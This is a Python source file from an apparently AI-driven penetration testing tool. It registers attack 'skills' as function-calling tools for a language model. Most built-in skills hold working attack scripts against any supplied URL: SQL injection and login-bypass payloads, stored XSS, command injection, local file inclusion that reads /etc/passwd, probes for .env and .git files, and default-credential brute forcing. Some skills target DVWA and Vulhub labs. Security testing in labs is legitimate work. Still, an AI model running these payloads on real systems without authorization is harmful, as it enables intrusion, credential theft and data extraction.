# -*- coding: utf-8 -*-
"""
Skills 注册表
管理所有可用的渗透测试技能
"""

import os
import json
import logging
from typing import TYPE_CHECKING, Dict, List, Optional, Any
from pathlib import Path

from .core import (
    Skill, SkillType, SkillCategory, SkillParameter, SkillExecutor
)

if TYPE_CHECKING:
    from .context import SkillContext

logger = logging.getLogger(__name__)


class SkillRegistry:
    """技能注册表"""
    
    def __init__(self):
        self.skills: Dict[str, Skill] = {}
        self.executor = SkillExecutor()
        self._load_builtin_skills()
        self._load_cve_exploit_skills()
        # 内置技能 ID 快照（保护内置技能不被用户覆盖）
        self._builtin_skill_ids: set = set(self.skills.keys())
        self._load_user_skills()

    def _load_cve_exploit_skills(self):
        """加载 CVE exploit 技能（Vulhub 靶场专用）"""
        try:
            from .cve_exploit_skills import get_cve_exploit_skills
            for skill in get_cve_exploit_skills():
                self.register(skill)
            logger.info(f"已加载 {len(get_cve_exploit_skills())} 个 CVE exploit 技能")
        except Exception as e:
            logger.warning(f"CVE exploit 技能加载失败: {e}")
    
    def _load_builtin_skills(self):
        """加载内置技能"""
        
        # ==================== SQL 注入 ====================
        self.register(Skill(
            id="sqli_basic",
            name="SQL注入基础检测",
            type=SkillType.POC,
            category=SkillCategory.SQL_INJECTION,
            description="检测目标是否存在基础 SQL 注入漏洞，通过注入 Payload 观察响应变化",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL"),
                SkillParameter("param", "string", False, "id", "注入参数名"),
                SkillParameter("method", "string", False, "GET", "请求方法"),
            ],
            target_type="url",
            severity="high",
            cve_id=None,
            tags=["sqli", "injection", "owasp-top10"],
            executor="builtin"
        ))
        
        self.register(Skill(
            id="sqli_union",
            name="SQL注入UNION利用",
            type=SkillType.EXPLOIT,
            category=SkillCategory.SQL_INJECTION,
            description="使用 UNION SELECT 技术提取数据库数据",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL"),
                SkillParameter("columns", "integer", False, 5, "列数"),
                SkillParameter("table", "string", False, "users", "目标表名"),
            ],
            target_type="url",
            severity="critical",
            tags=["sqli", "union", "data-extraction"],
            executor="python",
            code="""
import urllib.request
import urllib.parse

target = "{{target}}"
columns = {{columns}}
table_name = "{{table}}"

# 构建 UNION payload
cols = ",".join(["NULL"] * columns)
payload = f"' UNION SELECT {cols} FROM {table_name}--"
url = f"{target}?id={urllib.parse.quote(payload)}"

try:
    req = urllib.request.Request(url)
    response = urllib.request.urlopen(req, timeout=10)
    print(f"UNION Payload sent: {payload}")
    print(f"Response length: {len(response.read())}")
except Exception as e:
    print(f"Error: {e}")
"""
        ))
        
        self.register(Skill(
            id="sqli_time_blind",
            name="SQL注入时间盲注检测",
            type=SkillType.POC,
            category=SkillCategory.SQL_INJECTION,
            description="通过时间延迟检测盲注漏洞",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL"),
                SkillParameter("delay", "integer", False, 5, "延迟秒数"),
            ],
            target_type="url",
            severity="high",
            tags=["sqli", "blind", "time-based"],
            executor="python",
            code="""
import urllib.request
import urllib.parse
import time

target = "{{target}}"
delay = {{delay}}

payloads = [
    f"' AND SLEEP({delay})--",
    f"'; WAITFOR DELAY '0:0:{delay}'--",
    f"' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--",
]

for payload in payloads:
    start = time.time()
    try:
        url = f"{target}?id={urllib.parse.quote(payload)}"
        req = urllib.request.Request(url)
        urllib.request.urlopen(req, timeout=delay + 5)
        elapsed = time.time() - start
        
        if elapsed >= delay:
            print(f"TIME_BLIND_FOUND: {payload} (delayed {elapsed:.2f}s)")
        else:
            print(f"NO_DELAY: {payload}")
    except Exception as e:
        print(f"ERROR: {str(e)[:50]}")
"""
        ))
        
        # ==================== XSS ====================
        self.register(Skill(
            id="xss_reflected",
            name="反射型XSS检测",
            type=SkillType.POC,
            category=SkillCategory.XSS,
            description="检测反射型跨站脚本漏洞",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL"),
                SkillParameter("param", "string", False, "q", "测试参数"),
            ],
            target_type="url",
            severity="medium",
            tags=["xss", "reflected", "owasp-top10"],
            executor="builtin"
        ))
        
        self.register(Skill(
            id="xss_stored",
            name="存储型XSS检测",
            type=SkillType.POC,
            category=SkillCategory.XSS,
            description="检测存储型XSS，提交Payload后检查是否被存储和执行",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL"),
                SkillParameter("field", "string", False, "comment", "注入字段"),
            ],
            target_type="url",
            severity="high",
            tags=["xss", "stored"],
            executor="python",
            code="""
import urllib.request
import urllib.parse

target = "{{target}}"
field = "{{field}}"

payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "';alert(String.fromCharCode(88,83,83))//",
]

print(f"Testing stored XSS on {target}")
print(f"Field: {field}")

for payload in payloads:
    # 提交 payload
    data = urllib.parse.urlencode({field: payload}).encode()
    req = urllib.request.Request(target, data=data, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    
    try:
        response = urllib.request.urlopen(req, timeout=10)
        content = response.read().decode('utf-8', errors='ignore')
        
        if payload in content:
            print(f"STORED_XSS_FOUND: {payload[:50]}")
        else:
            print(f"NOT_STORED: {payload[:30]}...")
    except Exception as e:
        print(f"ERROR: {str(e)[:50]}")
"""
        ))
        
        # ==================== 认证绕过 ====================
        self.register(Skill(
            id="auth_bypass_sql",
            name="SQL认证绕过",
            type=SkillType.EXPLOIT,
            category=SkillCategory.AUTH_BYPASS,
            description="尝试使用SQL注入绕过登录认证",
            parameters=[
                SkillParameter("target", "string", True, description="登录页面URL"),
                SkillParameter("username_field", "string", False, "username", "用户名字段"),
                SkillParameter("password_field", "string", False, "password", "密码字段"),
            ],
            target_type="url",
            severity="critical",
            tags=["auth", "bypass", "sqli"],
            executor="python",
            code="""
import urllib.request
import urllib.parse

target = "{{target}}"
username_field = "{{username_field}}"
password_field = "{{password_field}}"

bypass_payloads = [
    ("admin'--", "anything"),
    ("admin' #", "anything"),
    ("' OR '1'='1", "' OR '1'='1"),
    ("admin'/*", "*/"),
    ("' OR ''='", "' OR ''='"),
]

success_indicators = ["welcome", "dashboard", "logout", "admin", "success"]

print(f"Testing auth bypass on: {target}")

for username, password in bypass_payloads:
    data = urllib.parse.urlencode({
        username_field: username,
        password_field: password
    }).encode()
    
    req = urllib.request.Request(target, data=data, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    
    try:
        response = urllib.request.urlopen(req, timeout=10)
        content = response.read().decode('utf-8', errors='ignore')
        
        for indicator in success_indicators:
            if indicator.lower() in content.lower():
                print(f"AUTH_BYPASS_SUCCESS: {username}:****")
                print(f"Indicator found: {indicator}")
                break
        else:
            print(f"FAILED: {username[:20]}")
    except Exception as e:
        print(f"ERROR: {str(e)[:50]}")
"""
        ))
        
        self.register(Skill(
            id="auth_bruteforce",
            name="认证暴力破解",
            type=SkillType.BRUTEFORCE,
            category=SkillCategory.AUTH_BYPASS,
            description="对登录表单进行暴力破解",
            parameters=[
                SkillParameter("target", "string", True, description="登录页面URL"),
                SkillParameter("username", "string", False, "admin", "用户名"),
            ],
            target_type="url",
            severity="medium",
            tags=["auth", "bruteforce"],
            executor="builtin"
        ))
        
        # ==================== 信息泄露 ====================
        self.register(Skill(
            id="info_backup_files",
            name="备份文件泄露检测",
            type=SkillType.RECON,
            category=SkillCategory.INFO_DISCLOSURE,
            description="检测常见备份文件泄露",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL"),
            ],
            target_type="url",
            severity="medium",
            tags=["info", "backup", "disclosure"],
            executor="python",
            code="""
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError

target = "{{target}}".rstrip('/')

try:
    req = urllib.request.Request(target or "http://invalid", method='HEAD')
    urllib.request.urlopen(req, timeout=3)
except urllib.error.HTTPError:
    pass
except Exception as e:
    print(f"目标不可达，跳过备份文件扫描: {e}")
    exit(0)

backup_files = [
    "/backup.sql", "/backup.zip", "/backup.tar.gz",
    "/db.sql", "/database.sql", "/dump.sql",
    "/backup/", "/bak/", "/old/",
    "/web.config", "/.git/config", "/.svn/entries",
    "/.env", "/config.php.bak", "/wp-config.php.bak",
]

def check_file(f):
    url = target + f
    try:
        req = urllib.request.Request(url, method='HEAD')
        response = urllib.request.urlopen(req, timeout=3)
        if response.status == 200:
            return f"FOUND: {url}"
    except Exception:
        pass
    return None

found = []
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = {executor.submit(check_file, f): f for f in backup_files}
    try:
        for future in as_completed(futures, timeout=20):
            result = future.result()
            if result:
                found.append(result)
    except TimeoutError:
        pass

if found:
    print("\\n".join(found))
else:
    print("No backup files found")
"""
        ))
        
        self.register(Skill(
            id="info_sensitive_paths",
            name="敏感路径扫描",
            type=SkillType.RECON,
            category=SkillCategory.INFO_DISCLOSURE,
            description="扫描常见敏感路径和目录",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL"),
            ],
            target_type="url",
            severity="low",
            tags=["recon", "paths"],
            executor="python",
            code="""
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError

target = "{{target}}".rstrip('/')

# 先检查目标是否可达（快速失败）
try:
    req = urllib.request.Request(target or "http://invalid", method='HEAD')
    urllib.request.urlopen(req, timeout=3)
except urllib.error.HTTPError:
    pass  # HTTP错误说明服务存在
except Exception as e:
    print(f"目标不可达，跳过敏感路径扫描: {e}")
    exit(0)

sensitive_paths = [
    "/admin", "/administrator", "/admin.php", "/admin/login",
    "/phpmyadmin", "/pma", "/mysql", "/myadmin",
    "/wp-admin", "/wp-login.php", "/wp-content",
    "/.git", "/.svn", "/.env", "/.htaccess",
    "/config", "/conf", "/configuration.php",
    "/api", "/api/v1", "/graphql",
    "/login", "/signin", "/register",
    "/upload", "/uploads", "/files",
    "/test", "/debug", "/dev",
    "/robots.txt", "/sitemap.xml", "/.DS_Store",
]

def check_path(path):
    url = target + path
    try:
        req = urllib.request.Request(url, method='GET')
        response = urllib.request.urlopen(req, timeout=3)
        if response.status in [200, 301, 302, 403]:
            return f"{response.status}: {url}"
    except urllib.error.HTTPError as e:
        if e.code in [401, 403]:
            return f"{e.code}: {url}"
    except Exception:
        pass
    return None

found = []
# 并发扫描，总超时30秒
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = {executor.submit(check_path, p): p for p in sensitive_paths}
    try:
        for future in as_completed(futures, timeout=30):
            result = future.result()
            if result:
                found.append(result)
    except TimeoutError:
        print("扫描超时，已获取部分结果")

if found:
    print("\\n".join(sorted(found)))
else:
    print("No sensitive paths found")
"""
        ))
        
        # ==================== RCE ====================
        self.register(Skill(
            id="rce_command_injection",
            name="命令注入检测",
            type=SkillType.POC,
            category=SkillCategory.RCE,
            description="检测操作系统命令注入漏洞",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL"),
                SkillParameter("param", "string", False, "cmd", "注入参数"),
            ],
            target_type="url",
            severity="critical",
            tags=["rce", "injection", "command"],
            executor="python",
            code="""
import urllib.request
import urllib.parse

target = "{{target}}"
param = "{{param}}"

payloads = [
    ";id",
    "|id",
    "`id`",
    "$(id)",
    "||id",
    "&&id",
    "; ping -c 1 127.0.0.1",
    "| ping -c 1 127.0.0.1",
]

indicators = ["uid=", "gid=", "groups=", "ping statistics", "bytes from"]

for payload in payloads:
    try:
        url = f"{target}?{param}={urllib.parse.quote(payload)}"
        req = urllib.request.Request(url)
        response = urllib.request.urlopen(req, timeout=15)
        content = response.read().decode('utf-8', errors='ignore')
        
        for indicator in indicators:
            if indicator in content:
                print(f"RCE_FOUND: {payload}")
                print(f"Evidence: {indicator}")
                break
        else:
            print(f"NO_RCE: {payload}")
    except Exception as e:
        print(f"ERROR: {str(e)[:50]}")
"""
        ))
        
        # ==================== LFI ====================
        self.register(Skill(
            id="lfi_basic",
            name="本地文件包含检测",
            type=SkillType.POC,
            category=SkillCategory.LFI,
            description="检测本地文件包含漏洞，自动枚举常见参数名和 PHP 包含路径",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL（基础URL或含路径，如 http://host/ 或 http://host/page.php）"),
                SkillParameter("param", "string", False, "", "指定参数名（为空则自动枚举常见参数名）"),
                SkillParameter("paths", "string", False, "", "额外测试的 PHP 路径列表，逗号分隔（如 /antibot_image/antibots/info.php）"),
            ],
            target_type="url",
            severity="high",
            tags=["lfi", "inclusion"],
            executor="python",
            code="""
import urllib.request
import urllib.parse

target = "{{target}}".rstrip('/')
param_hint = "{{param}}"
extra_paths = "{{paths}}"

# 常见 LFI 参数名
COMMON_PARAMS = [
    "file", "image", "page", "path", "include", "doc", "template",
    "load", "read", "content", "filename", "view", "url",
]

# LFI payload
PAYLOADS = [
    "/etc/passwd",
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "/proc/version",
]

# PHP wrapper (只在 .php 端点尝试)
PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=index.php",
]

INDICATORS = ["root:x:", "nobody:x:", "daemon:", "Linux version", "www-data"]

def test_url(url):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        resp = urllib.request.urlopen(req, timeout=8)
        content = resp.read().decode('utf-8', errors='ignore')
        for ind in INDICATORS:
            if ind in content:
                return True, content[:300]
        return False, ""
    except Exception as e:
        return False, str(e)[:50]

found = False

# 确定要测试的端点列表
endpoints = []

# 1. 目标本身（如果含 .php 则直接用）
if ".php" in target:
    endpoints.append(target)
else:
    # 加入常见 PHP 路径
    endpoints.append(target)

# 2. 用户指定的额外路径
if extra_paths.strip():
    for p in extra_paths.split(","):
        p = p.strip()
        if p:
            # 提取 base host
            from urllib.parse import urlparse
            parsed = urlparse(target)
            base = f"{parsed.scheme}://{parsed.netloc}"
            endpoints.append(base + p if not p.startswith("http") else p)

# 确定参数名列表
if param_hint.strip():
    params_to_try = [param_hint.strip()]
else:
    params_to_try = COMMON_PARAMS

for endpoint in endpoints:
    if found:
        break
    for param in params_to_try:
        if found:
            break
        for payload in PAYLOADS:
            url = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
            ok, content = test_url(url)
            if ok:
                print(f"LFI_FOUND: param={param} payload={payload}")
                print(f"URL: {url}")
                print(f"Evidence: {content[:200]}")
                found = True
                break
            # PHP wrappers only for .php endpoints
            if ".php" in endpoint and not found:
                for wrapper in PHP_WRAPPERS:
                    url2 = f"{endpoint}?{param}={urllib.parse.quote(wrapper)}"
                    ok2, c2 = test_url(url2)
                    if ok2:
                        print(f"LFI_FOUND(wrapper): param={param} payload={wrapper}")
                        print(f"URL: {url2}")
                        found = True
                        break

if not found:
    print("NO_LFI: 未发现文件包含漏洞")
    print(f"已测试端点: {len(endpoints)} | 参数: {len(params_to_try)} | Payload: {len(PAYLOADS)}")
"""
        ))
        
        # ==================== DVWA 特定 ====================
        self.register(Skill(
            id="dvwa_sqli",
            name="DVWA SQL注入利用",
            type=SkillType.EXPLOIT,
            category=SkillCategory.SQL_INJECTION,
            description="针对DVWA SQL注入模块的利用",
            parameters=[
                SkillParameter("target", "string", True, description="DVWA URL"),
                SkillParameter("level", "string", False, "low", "难度级别"),
            ],
            target_type="url",
            severity="critical",
            tags=["dvwa", "sqli", "exploit"],
            executor="python",
            code="""
import urllib.request
import urllib.parse

target = "{{target}}".rstrip('/')
level = "{{level}}"

# DVWA SQL注入页面
sqli_url = f"{target}/vulnerabilities/sqli/"

# 常见 DVWA 凭据
cookies = "security=low; PHPSESSID=dvwa"

payloads = {
    "low": [
        "' OR '1'='1",
        "' UNION SELECT user,password FROM users--",
        "' UNION SELECT NULL,NULL--",
    ],
    "medium": [
        "1 OR 1=1",
        "1 UNION SELECT user,password FROM users",
    ],
    "high": [
        "' OR '1'='1' LIMIT 1--",
    ]
}

for payload in payloads.get(level, payloads["low"]):
    try:
        url = f"{sqli_url}?id={urllib.parse.quote(payload)}&Submit=Submit"
        req = urllib.request.Request(url)
        req.add_header('Cookie', cookies)
        
        response = urllib.request.urlopen(req, timeout=10)
        content = response.read().decode('utf-8', errors='ignore')
        
        # 检测成功标志
        if "admin" in content.lower() or "password" in content.lower():
            print(f"DVWA_SQLI_SUCCESS: {payload}")
            # 提取数据
            import re
            users = re.findall(r'([\\w]+):([\\w]+)', content)
            if users:
                print(f"EXTRACTED: {users[:3]}")
        else:
            print(f"FAILED: {payload[:30]}")
    except Exception as e:
        print(f"ERROR: {str(e)[:50]}")
"""
        ))
        
        self.register(Skill(
            id="dvwa_xss",
            name="DVWA XSS利用",
            type=SkillType.EXPLOIT,
            category=SkillCategory.XSS,
            description="针对DVWA XSS模块的利用",
            parameters=[
                SkillParameter("target", "string", True, description="DVWA URL"),
            ],
            target_type="url",
            severity="medium",
            tags=["dvwa", "xss"],
            executor="python",
            code="""
import urllib.request
import urllib.parse

target = "{{target}}".rstrip('/')
xss_url = f"{target}/vulnerabilities/xss_r/"
cookies = "security=low; PHPSESSID=dvwa"

payloads = [
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert(document.cookie)>",
]

for payload in payloads:
    try:
        url = f"{xss_url}?name={urllib.parse.quote(payload)}"
        req = urllib.request.Request(url)
        req.add_header('Cookie', cookies)
        
        response = urllib.request.urlopen(req, timeout=10)
        content = response.read().decode('utf-8', errors='ignore')
        
        if payload in content:
            print(f"DVWA_XSS_SUCCESS: {payload}")
        else:
            print(f"PAYLOAD_MODIFIED: checking...")
            if "<script>" in content.lower():
                print("XSS vector present in response")
    except Exception as e:
        print(f"ERROR: {str(e)[:50]}")
"""
        ))
        
        self.register(Skill(
            id="dvwa_bruteforce",
            name="DVWA暴力破解",
            type=SkillType.BRUTEFORCE,
            category=SkillCategory.AUTH_BYPASS,
            description="暴力破解DVWA登录",
            parameters=[
                SkillParameter("target", "string", True, description="DVWA URL"),
            ],
            target_type="url",
            severity="medium",
            tags=["dvwa", "bruteforce"],
            executor="python",
            code="""
import urllib.request
import urllib.parse

target = "{{target}}".rstrip('/')
login_url = f"{target}/login.php"

# DVWA 默认凭据
credentials = [
    ("admin", "password"),
    ("admin", "admin"),
    ("admin", "123456"),
    ("gordonb", "abc123"),
    ("1337", "charley"),
    ("pablo", "letmein"),
    ("smithy", "password"),
]

for username, password in credentials:
    try:
        data = urllib.parse.urlencode({
            "username": username,
            "password": password,
            "Login": "Login"
        }).encode()
        
        req = urllib.request.Request(login_url, data=data, method='POST')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        
        response = urllib.request.urlopen(req, timeout=10)
        content = response.read().decode('utf-8', errors='ignore')
        
        # 检测成功标志
        if "index.php" in content or "Welcome" in content:
            print(f"LOGIN_SUCCESS: {username}:****")
            break
        else:
            print(f"FAILED: {username}:****")
    except Exception as e:
        if "redirect" in str(e).lower():
            print(f"LOGIN_SUCCESS: {username}:****")
"""
        ))
        
        logger.info(f"已加载 {len(self.skills)} 个内置技能")
        
        # 加载扩展 Skills (来自优秀项目)
        self._load_extended_skills()
    
    def _load_extended_skills(self):
        """加载扩展技能"""
        try:
            from .extended_skills import get_extended_skills
            extended = get_extended_skills()
            for skill in extended:
                self.register(skill)
            logger.info(f"已加载 {len(extended)} 个扩展技能")
        except Exception as e:
            logger.warning(f"加载扩展技能失败: {e}")
        
        # 加载增强检测技能
        self._load_enhanced_detection_skills()
    
    def _load_enhanced_detection_skills(self):
        """加载增强检测技能 - 基于vuln_detector"""
        try:
            from ..vuln_detector import EnhancedVulnerabilityDetector, quick_scan, deep_scan
            
            # 快速扫描技能
            self.register(Skill(
                id="vuln_quick_scan",
                name="漏洞快速扫描",
                type=SkillType.SCANNER,
                category=SkillCategory.GENERAL,
                description="快速扫描目标常见漏洞，包括SQLi、XSS、RCE、LFI等",
                parameters=[
                    SkillParameter("target", "string", True, description="目标URL"),
                ],
                target_type="url",
                severity="high",
                tags=["scan", "vulnerability", "detection"],
                executor="builtin"
            ))
            
            # 深度扫描技能
            self.register(Skill(
                id="vuln_deep_scan",
                name="漏洞深度扫描",
                type=SkillType.SCANNER,
                category=SkillCategory.GENERAL,
                description="深度扫描目标，多轮验证，减少误报，提高检测率",
                parameters=[
                    SkillParameter("target", "string", True, description="目标URL"),
                ],
                target_type="url",
                severity="high",
                tags=["scan", "deep", "verification"],
                executor="builtin"
            ))
            
            # WAF检测技能
            self.register(Skill(
                id="waf_detection",
                name="WAF防火墙检测",
                type=SkillType.RECON,
                category=SkillCategory.GENERAL,
                description="检测目标是否存在WAF，识别WAF类型（Cloudflare、AWS WAF等）",
                parameters=[
                    SkillParameter("target", "string", True, description="目标URL"),
                ],
                target_type="url",
                severity="info",
                tags=["waf", "firewall", "recon"],
                executor="builtin"
            ))
            
            logger.info("已加载增强检测技能")
        except Exception as e:
            logger.warning(f"加载增强检测技能失败: {e}")
    
    # ──────────────────────────────────────────────
    # 多层级用户自定义技能加载（Layer 4/5）
    # ──────────────────────────────────────────────

    def _load_user_skills(self):
        """
        加载用户自定义技能（Markdown 格式）。

        加载顺序（后加载的优先，但不覆盖内置技能）：
          Layer 5: User-global  — ~/.clawai/skills/*.md
          Layer 4: Project-level — .clawai/skills/*.md  (当前工作目录)

        同名 ID 规则：
          - 内置技能（Layer 1-3）不可被覆盖
          - Project-level 覆盖 User-global（本地配置优先）
        """
        from .markdown_loader import load_skills_from_dir

        user_dir = Path.home() / ".clawai" / "skills"
        project_dir = Path.cwd() / ".clawai" / "skills"

        loaded = 0

        # Layer 5: User-global（先加载，优先级较低）
        for skill in load_skills_from_dir(str(user_dir)):
            if skill.id in getattr(self, '_builtin_skill_ids', set()):
                logger.warning(
                    f"[UserSkills] 跳过 '{skill.id}'：与内置技能同名，内置技能受保护"
                )
                continue
            self.skills[skill.id] = skill
            loaded += 1

        # Layer 4: Project-level（后加载，覆盖 user-global 同名技能）
        for skill in load_skills_from_dir(str(project_dir)):
            if skill.id in getattr(self, '_builtin_skill_ids', set()):
                logger.warning(
                    f"[UserSkills] 跳过 '{skill.id}'：与内置技能同名，内置技能受保护"
                )
                continue
            self.skills[skill.id] = skill
            loaded += 1

        if loaded:
            logger.info(f"[UserSkills] 共加载 {loaded} 个用户自定义技能")

    def reload_user_skills(self):
        """
        热重载用户自定义技能，不影响内置技能。

        可在运行时调用，适合：
          - 用户新增/修改了 .clawai/skills/ 中的文件
          - 切换工作目录后刷新 project-level 技能
        """
        # 移除上次加载的用户技能（非内置）
        user_skill_ids = [
            sid for sid in list(self.skills.keys())
            if sid not in getattr(self, '_builtin_skill_ids', set())
        ]
        for sid in user_skill_ids:
            del self.skills[sid]

        self._load_user_skills()
        logger.info("[UserSkills] 用户技能已热重载")

    def register(self, skill: Skill):
        """注册技能"""
        self.skills[skill.id] = skill
        logger.debug(f"注册技能: {skill.id} - {skill.name}")
    
    def unregister(self, skill_id: str):
        """注销技能"""
        if skill_id in self.skills:
            del self.skills[skill_id]
    
    def get(self, skill_id: str) -> Optional[Skill]:
        """获取技能"""
        return self.skills.get(skill_id)

    def get_skill(self, skill_id: str) -> Optional[Skill]:
        """获取技能（get 的别名，兼容旧调用）"""
        return self.get(skill_id)

    def get_all_skill_names(self) -> List[str]:
        """返回所有技能 ID 列表"""
        return list(self.skills.keys())
    
    def list(self, 
             type: SkillType = None,
             category: SkillCategory = None,
             severity: str = None,
             tags: List[str] = None) -> List[Skill]:
        """列出技能"""
        result = list(self.skills.values())
        
        if type:
            result = [s for s in result if s.type == type]
        if category:
            result = [s for s in result if s.category == category]
        if severity:
            result = [s for s in result if s.severity == severity]
        if tags:
            result = [s for s in result if any(t in s.tags for t in tags)]
        
        return result
    
    def execute(self, skill_id: str, params: Dict[str, Any], context: Optional["SkillContext"] = None) -> Dict[str, Any]:
        """执行技能"""
        skill = self.get(skill_id)
        if not skill:
            return {"success": False, "error": f"技能不存在: {skill_id}"}
        
        return self.executor.execute(skill, params, context=context)
    
    def get_openai_tools(self) -> List[Dict[str, Any]]:
        """获取所有技能的 OpenAI Function Calling Schema"""
        return [skill.get_openai_schema() for skill in self.skills.values() if skill.enabled]
    
    def search(self, query: str, top_k: int = 5) -> List[Skill]:
        """搜索技能"""
        query_lower = query.lower()
        results = []
        
        for skill in self.skills.values():
            score = 0
            if query_lower in skill.name.lower():
                score += 3
            if query_lower in skill.description.lower():
                score += 2
            if any(query_lower in tag.lower() for tag in skill.tags):
                score += 1
            
            if score > 0:
                results.append((score, skill))
        
        results.sort(key=lambda x: x[0], reverse=True)
        return [s for _, s in results[:top_k]]


# 全局注册表
_registry: Optional[SkillRegistry] = None


def get_skill_registry() -> SkillRegistry:
    """获取全局技能注册表"""
    global _registry
    if _registry is None:
        _registry = SkillRegistry()
    return _registry
